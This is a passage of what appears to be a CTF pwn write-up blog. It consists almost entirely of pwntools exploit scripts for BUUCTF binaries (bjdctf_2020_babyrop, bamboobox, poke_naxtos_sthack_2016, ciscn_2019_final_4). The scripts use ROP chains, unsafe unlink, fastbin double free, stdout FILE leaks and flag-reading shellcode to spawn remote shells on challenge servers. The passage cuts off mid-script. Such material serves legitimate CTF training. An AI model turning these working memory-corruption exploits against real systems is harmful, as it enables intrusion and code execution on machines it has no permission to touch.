add(0x80,'\x99'*0x64)</span><br><span class="line">    add(0x84,'\x11'*0x84)</span><br><span class="line">    add(0xf8,'\x22'*0xf8)</span><br><span class="line">    add(0x24,'\x33'*0x24)</span><br><span class="line">    edit(3,'\x44'*0xf6)</span><br><span class="line">    payload = p32(0xdeadbeef) + p32(0x81) + p32(0x080EBA40 + 4*3 - 12) + p32(0x080EBA40 +3*4 - 8)</span><br><span class="line">    payload = payload.ljust(0x80,'\x44') + p32(0x80)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    free(4)</span><br><span class="line">    open_shellcode = "xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00000067;push 0x616c662f;mov ebx,esp;int 0x80;"</span><br><span class="line">    read_shellcode = "mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;"</span><br><span class="line">    write_shellcode = "mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;"</span><br><span class="line">    shellcode = open_shellcode + read_shellcode + write_shellcode</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    edit(3,p32(0x80eba00))</span><br><span class="line">    edit(0,p32(0x500)*6)</span><br><span class="line">    edit(3,p32(0x80EA4D8)*2 + p32(0x80eba60))</span><br><span class="line">    edit(2,payload)</span><br><span class="line">    edit(1,p32(0x80eba60))</span><br><span class="line">    add(0x55,"")</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node1.buuoj.cn",28948,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x46-bjdctf-2020-babyrop"><a href="#0x46-bjdctf-2020-babyrop" class="headerlink" title="0x46 bjdctf_2020_babyrop"></a>0x46 bjdctf_2020_babyrop</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from PwnContext import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span><br><span class="line">context.log_level = 'CRITICAL'</span><br><span class="line">remote_ip        = b'127.0.0.1'</span><br><span class="line">remote_port      = 9999</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">binary_file      = './%s' % "bjdctf_2020_babyrop"</span><br><span class="line">remote_libc_file = "libc-2.23_ubuntu16_x64.so"</span><br><span class="line">#cp /tools/libc/ ./libc-2.23_ubuntu16_x64.so</span><br><span class="line">def exploit(sh,remote = False,awd = False):</span><br><span class="line">    if awd:</span><br><span class="line">        context.log_level = b"CRITICAL"</span><br><span class="line">        ctx.binary = './%s' % "bjdctf_2020_babyrop"</span><br><span class="line">        ctx.remote_libc = "libc-2.23_ubuntu16_x64.so"</span><br><span class="line">        #ctx.remote_libc =b'/tools/libc-database-master/db/libc6_2.23-0ubuntu10_amd64.so'</span><br><span class="line">        #ctx.remote_libc =b'/tools/libc/libc-2.23_ubuntu16_x32.so'</span><br><span class="line">    elf = ctx.binary</span><br><span class="line">    if awd or remote:</span><br><span class="line">        lib = ctx.remote_libc</span><br><span class="line">    else:</span><br><span class="line">        lib = ctx.libc</span><br><span class="line">    def debug(gdb_script = ""):</span><br><span class="line">        gdb.attach(sh,gdb_script)</span><br><span class="line">    if context.arch == b"amd64":</span><br><span class="line">        pop_rdi_ret = elf.search(asm(b"pop rdi ; ret")).next()</span><br><span class="line">        pop_rsi_r15_ret = elf.search(asm(b"pop rsi ; pop r15 ; ret")).next()</span><br><span class="line">    elif context.arch == b"i386":</span><br><span class="line">        pop_ebp_ret = elf.search(asm(b"pop ebp ; ret")).next()</span><br><span class="line">        pop3_ret    = elf.search(asm(b"pop esi ; pop edi ; pop ebp ; ret")).next()</span><br><span class="line">    s       = lambda data               :sh.send(str(data))</span><br><span class="line">    sa      = lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">    sl      = lambda data               :sh.sendline(str(data))</span><br><span class="line">    sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       = lambda numb=4096          :sh.recv(numb)</span><br><span class="line">    ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)</span><br><span class="line">    irt     = lambda                    :sh.interactive()</span><br><span class="line">    uu32    = lambda data               :u32(data.ljust(4, b'\x00'))</span><br><span class="line">    uu64    = lambda data               :u64(data.ljust(8, b'\x00'))</span><br><span class="line">    ru7f    = lambda                    :u64(sh.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))</span><br><span class="line">    ruf7    = lambda                    :u32(sh.recvuntil("\xf7")[-4:].ljust(4,b'\x00'))</span><br><span class="line">    lg      = lambda data               :log.success(data)</span><br><span class="line">    offset = 0x28</span><br><span class="line">    payload = offset * "a"</span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(elf.got['__libc_start_main'])</span><br><span class="line">    payload += p64(elf.plt['puts'])</span><br><span class="line">    payload += p64(elf.symbols['main'])</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    __libc_start_main = ru7f()</span><br><span class="line">    libc = __libc_start_main - lib.symbols[b'__libc_start_main']</span><br><span class="line">    lib.address = libc</span><br><span class="line">    system = lib.symbols[b'system']</span><br><span class="line">    binsh = lib.search(b"/bin/sh\x00").next()</span><br><span class="line">    __free_hook = lib.symbols[b'__free_hook']</span><br><span class="line">    __malloc_hook = lib.symbols[b'__malloc_hook']</span><br><span class="line">    __realloc_hook = lib.symbols[b'__realloc_hook']</span><br><span class="line">    one_gadget = []</span><br><span class="line">    offset = 0x28</span><br><span class="line">    payload = offset * "a"</span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(binsh)</span><br><span class="line">    payload += p64(system)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    if awd == False:</span><br><span class="line">        irt()</span><br><span class="line">if __name__ == b"__main__":</span><br><span class="line">    exploit(remote(remote_ip,remote_port),remote=True)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x47-bamboobox"><a href="#0x47-bamboobox" class="headerlink" title="0x47 bamboobox"></a>0x47 bamboobox</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from PwnContext import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span><br><span class="line">context.log_level = 'CRITICAL'</span><br><span class="line">remote_ip        = b'node3.buuoj.cn'</span><br><span class="line">remote_port      = 26956</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">binary_file      = './%s' % "bamboobox"</span><br><span class="line">remote_libc_file = "libc-2.23.so"</span><br><span class="line">#cp /tools/libc/ ./libc-2.23.so</span><br><span class="line">gdb_attach_remote_port = 55667</span><br><span class="line">def exploit(sh,remote = False,awd = False):</span><br><span class="line">    if awd:</span><br><span class="line">        context.log_level = b"CRITICAL"</span><br><span class="line">        ctx.binary = './%s' % "bamboobox"</span><br><span class="line">        ctx.remote_libc = "libc-2.23.so"</span><br><span class="line">        #ctx.remote_libc =b'/tools/libc-database-master/db/libc6_2.23-0ubuntu10_amd64.so'</span><br><span class="line">        #ctx.remote_libc =b'/tools/libc/libc-2.23_ubuntu16_x32.so'</span><br><span class="line">    elf = ctx.binary</span><br><span class="line">    if awd or remote:</span><br><span class="line">        lib = ctx.remote_libc</span><br><span class="line">    else:</span><br><span class="line">        lib = ctx.libc</span><br><span class="line">    def debug(gdb_script = ""):</span><br><span class="line">        gdb.attach(sh,gdb_script)</span><br><span class="line">    if context.arch == b"amd64":</span><br><span class="line">        pop_rdi_ret = elf.search(asm(b"pop rdi ; ret")).next()</span><br><span class="line">        pop_rsi_r15_ret = elf.search(asm(b"pop rsi ; pop r15 ; ret")).next()</span><br><span class="line">    elif context.arch == b"i386":</span><br><span class="line">        pop_ebp_ret = elf.search(asm(b"pop ebp ; ret")).next()</span><br><span class="line">        pop3_ret    = elf.search(asm(b"pop esi ; pop edi ; pop ebp ; ret")).next()</span><br><span class="line">    s       = lambda data               :sh.send(str(data))</span><br><span class="line">    sa      = lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">    sl      = lambda data               :sh.sendline(str(data))</span><br><span class="line">    sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       = lambda numb=4096          :sh.recv(numb)</span><br><span class="line">    ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)</span><br><span class="line">    irt     = lambda                    :sh.interactive()</span><br><span class="line">    uu32    = lambda data               :u32(data.ljust(4, b'\x00'))</span><br><span class="line">    uu64    = lambda data               :u64(data.ljust(8, b'\x00'))</span><br><span class="line">    ru7f    = lambda                    :u64(sh.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))</span><br><span class="line">    ruf7    = lambda                    :u32(sh.recvuntil("\xf7")[-4:].ljust(4,b'\x00'))</span><br><span class="line">    lg      = lambda data               :log.success(data)</span><br><span class="line">    def add(size,content):</span><br><span class="line">        sla(":","2")</span><br><span class="line">        sla(":",str(size))</span><br><span class="line">        sa(":",str(content))</span><br><span class="line">    def show():</span><br><span class="line">        sla(":","1")</span><br><span class="line">    def edit(idx,size,content):</span><br><span class="line">        sla(":","3")</span><br><span class="line">        sla(":",str(idx))</span><br><span class="line">        sla(":",str(size))</span><br><span class="line">        sa(":",content)</span><br><span class="line">    def free(idx):</span><br><span class="line">        sla(":","4")</span><br><span class="line">        sla(":",str(idx))</span><br><span class="line">    chunk_list = 0x6020C8</span><br><span class="line">    add(0x18,'a')</span><br><span class="line">    add(0x18,'a')</span><br><span class="line">    add(0x18,'a')</span><br><span class="line">    add(0x88,'\x11' * 0x87)</span><br><span class="line">    add(0xf8,'\x12' * 0xf7)</span><br><span class="line">    add(0x18,'\x13' * 0x17)</span><br><span class="line">    payload = p64(0) + p64(0x81)</span><br><span class="line">    payload += p64(0x6020f8 - 0x18) + p64(0x6020f8 - 0x10)</span><br><span class="line">    payload = payload.ljust(0x80,'\x00')</span><br><span class="line">    payload += p64(0x80) + p64(0x100)</span><br><span class="line">    edit(3,0x100,payload)</span><br><span class="line">    free(4)</span><br><span class="line"></span><br><span class="line">    payload = p64(0x100)</span><br><span class="line">    payload += p64(chunk_list) + p64(0x100)</span><br><span class="line">    payload += p64(elf.got['__libc_start_main']) + p64(0x100)</span><br><span class="line">    edit(3,0x100,payload)</span><br><span class="line">    show()</span><br><span class="line">    __libc_start_main = ru7f()</span><br><span class="line">    libc = __libc_start_main - lib.symbols[b'__libc_start_main']</span><br><span class="line">    lib.address = libc</span><br><span class="line">    system = lib.symbols[b'system']</span><br><span class="line">    binsh = lib.search(b"/bin/sh\x00").next()</span><br><span class="line">    __free_hook = lib.symbols[b'__free_hook']</span><br><span class="line">    __malloc_hook = lib.symbols[b'__malloc_hook']</span><br><span class="line">    __realloc_hook = lib.symbols[b'__realloc_hook']</span><br><span class="line">    one_gadget = []</span><br><span class="line">    payload = p64(lib.symbols['__free_hook']) + p64(0x100)</span><br><span class="line">    payload += p64(binsh) + p64(0x100)</span><br><span class="line">    edit(2,0x100,payload)</span><br><span class="line">    edit(0,0x100,p64(system))</span><br><span class="line">    free(1)</span><br><span class="line">    if awd == False:</span><br><span class="line">        irt()</span><br><span class="line">def CTF_exploit(argv):</span><br><span class="line">    global remote_ip,remote_port,binary_file,remote_libc_file</span><br><span class="line">    argv_len = len(argv)</span><br><span class="line">    context.log_level = b"DEBUG"</span><br><span class="line">    ctx.binary = binary_file</span><br><span class="line">    ctx.remote_libc = remote_libc_file</span><br><span class="line">    ctx.custom_lib_dir = "/tools/glibc-all-in-one-master/libs/2.23-0ubuntu11_amd64/"</span><br><span class="line">    #ctx.debug_remote_libc = True</span><br><span class="line">    if argv_len == 1:</span><br><span class="line">        sh = ctx.start()</span><br><span class="line">        exploit(sh)</span><br><span class="line">        return</span><br><span class="line">    elif argv_len == 2:</span><br><span class="line">        if argv[1] == "remote":</span><br><span class="line">            ctx.debug_remote_libc = False</span><br><span class="line">            </span><br><span class="line">            ctx.remote = (remote_ip,remote_port)</span><br><span class="line">            sh = ctx.start("remote")</span><br><span class="line">            exploit(sh,remote = True)</span><br><span class="line">            return</span><br><span class="line">        elif argv[1] == "local":</span><br><span class="line">            sh = ctx.start()</span><br><span class="line">            exploit(sh)</span><br><span class="line">            return</span><br><span class="line">        elif argv[1] == "awd":</span><br><span class="line">            context.log_level = b"CRITICAL"</span><br><span class="line">            ctx.remote = (remote_ip,remote_port)</span><br><span class="line">            sh = ctx.start("remote")</span><br><span class="line">            exploit(sh,remote = True)</span><br><span class="line">            return</span><br><span class="line">    elif argv_len == 3:</span><br><span class="line">        ctx.remote = (argv[1],int(argv[2],10))</span><br><span class="line">        sh = ctx.start("remote")</span><br><span class="line">        exploit(sh,remote = True)</span><br><span class="line">        return</span><br><span class="line">    else:</span><br><span class="line">        sh = ctx.start()</span><br><span class="line">        exploit(sh)</span><br><span class="line">if __name__ == b"__main__":</span><br><span class="line">    CTF_exploit(sys.argv)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x48-poke-naxtos-sthack-2016"><a href="#0x48-poke-naxtos-sthack-2016" class="headerlink" title="0x48 poke_naxtos_sthack_2016"></a>0x48 poke_naxtos_sthack_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("poke_naxtos_sthack_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./poke_naxtos_sthack_2016")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">	sh.sendline("41")</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("pik4_p455")</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	offset = 112</span><br><span class="line">	pop_ebp_ret = 0x0804887f</span><br><span class="line">	payload = offset*"a" + p32(elf.plt['puts']) + p32(pop_ebp_ret) + p32(elf.got['__libc_start_main']) + p32(elf.symbols['_start'])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Cheat Activated !\n")</span><br><span class="line">	__libc_start_main = u32(sh.recvuntil("\xf7"))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	sh.sendline("41")</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("pik4_p455")</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p32(system) + p32(pop_ebp_ret) + p32(0x080482DB)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20084,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x49-ciscn-2019-final-4"><a href="#0x49-ciscn-2019-final-4" class="headerlink" title="0x49 ciscn_2019_final_4"></a>0x49 ciscn_2019_final_4</h2><h3 id="和ciscn-sw-10类似"><a href="#和ciscn-sw-10类似" class="headerlink" title="和ciscn_sw_10类似"></a>和ciscn_sw_10类似</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_final_4_back")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.sendlineafter(">>","1")</span><br><span class="line">	sh.sendlineafter("?",str(size))</span><br><span class="line">	sh.sendafter("?",content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter(">>","3")</span><br><span class="line">	sh.sendlineafter("?",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter(">>","2")</span><br><span class="line">	sh.sendlineafter("?",str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">	sh.sendafter("what is your name?",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_final_4_back")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	</span><br><span class="line">	inputName(p64(0x61) * (0xff / 8))</span><br><span class="line">	add(0x68,'\x11' * 0x68)</span><br><span class="line">	add(0x68,'\x12' * 0x68)</span><br><span class="line">	payload = '\x13' * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">	add(0x68,payload)	</span><br><span class="line">	add(0x88,'\x14' * 0x88)</span><br><span class="line">	add(0x38,'\x15' * 0x38)</span><br><span class="line">	add(0x38,'\x15' * 0x38)</span><br><span class="line">	add(0x58,'%17$paaaa%54$p')</span><br><span class="line">	free(3)</span><br><span class="line">	show(3)</span><br><span class="line">	main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	stdout = libc + lib.symbols['_IO_2_1_stdout_']</span><br><span class="line">	printf = libc + lib.symbols['printf']</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	heap_base = (u64(sh.recvuntil('\n--------------------',True)[-3:].ljust(8,'\x00')) >> 8) << 8</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload = '\x00' * 3</span><br><span class="line">	payload += p64(0) * 6</span><br><span class="line">	payload += p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols['environ']) + p64(libc + lib.symbols['environ'] + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	stack_end = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">	canary_pos = stack_end - (0x3258 - 0x3158)</span><br><span class="line">	fastbin_attack = stack_end - 0x7fffffffe548 + 0x7fffffffe2e8 - 3</span><br><span class="line">	ret_addr = stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload = '\x00' * 3</span><br><span class="line">	payload += p64(0) * 6</span><br><span class="line">	payload += p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	canary = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">	pop_rdi_ret = libc + lib.search(asm("pop rdi\nret")).next()</span><br><span class="line">	